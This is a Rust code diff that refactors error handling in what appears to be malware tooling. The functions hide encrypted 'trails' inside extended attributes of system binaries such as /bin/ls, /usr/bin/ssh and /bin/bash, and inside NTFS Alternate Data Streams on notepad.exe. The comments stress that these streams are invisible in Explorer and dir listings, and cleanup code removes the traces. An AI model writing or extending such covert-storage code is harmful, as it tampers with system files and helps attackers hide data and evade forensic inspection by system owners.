@@ -26,8 +26,8 @@ pub fn leave_trail_xattr(key: &str, value: &[u8]) -> bool {
     let encrypted = encrypt_trail(value);
 
     for target in &targets {
-        let c_key = std::ffi::CString::new(XATTR_NAME).unwrap();
-        let c_path = std::ffi::CString::new(*target).unwrap();
+        let c_key = std::ffi::CString::new(XATTR_NAME).expect("XATTR_NAME without null");
+        let c_path = std::ffi::CString::new(*target).expect("target path without null");
         let c_val = encrypted.as_slice();
 
         unsafe {
@@ -54,8 +54,8 @@ pub fn read_trails_xattr() -> Vec<(String, Vec<u8>)> {
     let mut trails = Vec::new();
 
     for target in &targets {
-        let c_key = std::ffi::CString::new(XATTR_NAME).unwrap();
-        let c_path = std::ffi::CString::new(*target).unwrap();
+        let c_key = std::ffi::CString::new(XATTR_NAME).expect("XATTR_NAME without null");
+        let c_path = std::ffi::CString::new(*target).expect("target path without null");
 
         // Get attribute size first
         let size = unsafe {
@@ -82,7 +82,7 @@ pub fn read_trails_xattr() -> Vec<(String, Vec<u8>)> {
 /// Leave an encrypted trail as an NTFS Alternate Data Stream.
 /// ADS is invisible in Explorer and normal `dir` output.
 /// Only visible with `dir /r` or tools like streams.exe.
-pub fn leave_trail_ads(key: &str, value: &[u8]) -> bool {
+pub fn leave_trail_ads(_key: &str, value: &[u8]) -> bool {
     // Windows NTFS ADS: write to legitimate binary with :stream_name
     let targets = [
         "C:\\Windows\\System32\\notepad.exe",
@@ -193,9 +193,9 @@ pub fn read_all_trails() -> Vec<(String, Vec<u8>)> {
 pub fn clean_trails() {
     // Clean xattr (remove attribute from binaries)
     let targets = ["/bin/ls", "/bin/ps", "/usr/bin/ssh", "/bin/bash"];
-    let c_key = std::ffi::CString::new(XATTR_NAME).unwrap();
+    let c_key = std::ffi::CString::new(XATTR_NAME).expect("XATTR_NAME without null");
     for target in &targets {
-        let c_path = std::ffi::CString::new(*target).unwrap();
+        let c_path = std::ffi::CString::new(*target).expect("target path without null");
         unsafe { libc::removexattr(c_path.as_ptr(), c_key.as_ptr()); }
     }
     // Clean file trails
